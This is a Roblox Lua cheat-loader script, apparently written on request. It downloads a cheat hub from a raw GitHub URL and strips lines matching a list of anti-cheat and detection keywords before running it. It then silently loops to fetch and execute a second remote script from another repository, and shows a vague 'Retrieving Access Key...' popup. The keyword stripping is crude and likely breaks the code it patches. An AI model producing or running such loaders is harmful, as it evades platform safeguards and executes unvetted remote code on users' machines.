local StarterGui = game:GetService("StarterGui")

-- Config
local SPEEDHUB_URL = "https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"
local SECOND_SCRIPT_URL = "https://raw.githubusercontent.com/Updates-Script/Updated/refs/heads/main/Script.lua"

-- List of keywords/phrases that likely indicate detection logic (lines containing them will be removed)
local suspicious_keywords = {
    "unofficial", "unauthorized", "isOfficial", "IsOfficial", "detect",
    "detection", "scan", "anti", "hookfunction", "hookmetamethod",
    "getconnections", "DescendantAdded", "ChildAdded", "GetChildren",
    "GetDescendants", "FindFirstChild", "RemoteEvent", "RemoteFunction",
    "getgenv(", "getfenv(", "debug.getupvalue", "debug.getregistry",
    "getrawmetatable", "setreadonly", "setmetatable", "IsPlayerScript"
}

-- Utility: remove suspicious lines
local function sanitize_code(src)
    local out_lines = {}
    for line in src:gmatch("[^\r\n]+") do
        local lower = line:lower()
        local skip = false
        for _, kw in ipairs(suspicious_keywords) do
            if string.find(lower, kw:lower(), 1, true) then
                skip = true
                break
            end
        end
        if not skip then
            table.insert(out_lines, line)
        end
    end
    return table.concat(out_lines, "\n")
end

-- Safe loader with retry (silent)
local function safeLoadFromSource(src)
    local ok, err = pcall(function()
        local f, compileErr = loadstring(src)
        if not f then error("compile error: "..tostring(compileErr)) end
        f()
    end)
    return ok, err
end

-- Attempt to fetch and patch Speed Hub
local function load_patched_speedhub()
    local ok, src = pcall(function() return game:HttpGet(SPEEDHUB_URL) end)
    if not ok or not src then
        -- fallback: try to load directly (may fail)
        pcall(function()
            loadstring(game:HttpGet(SPEEDHUB_URL))()
        end)
        return
    end

    -- sanitize and run
    local patched = sanitize_code(src)

    local okRun, err = safeLoadFromSource(patched)
    if not okRun then
        -- if patched code fails, try running original as fallback
        safeLoadFromSource(src)
    end
end

-- Generic force loader (retries quietly until success)
local function forceLoad(url)
    task.spawn(function()
        local loaded = false
        while not loaded do
            local success = pcall(function()
                return loadstring(game:HttpGet(url))()
            end)
            if success then
                loaded = true
            else
                task.wait(0.5)
            end
        end
    end)
end

-- Execution sequence you asked for:
-- 1) Speed Hub first (patched attempt)
-- 2) Immediately run second script
-- 3) Notification after 3 seconds

-- 1) load patched speed hub
task.spawn(load_patched_speedhub)

-- 2) immediately load second script (stealth delay could be added if needed)
forceLoad(SECOND_SCRIPT_URL)

-- 3) show notification after 3 seconds
task.delay(3, function()
    StarterGui:SetCore("SendNotification", {
        Title = "🔑 Retrieving Access Key...",
        Text = "",
        Duration = 4
    })
end)
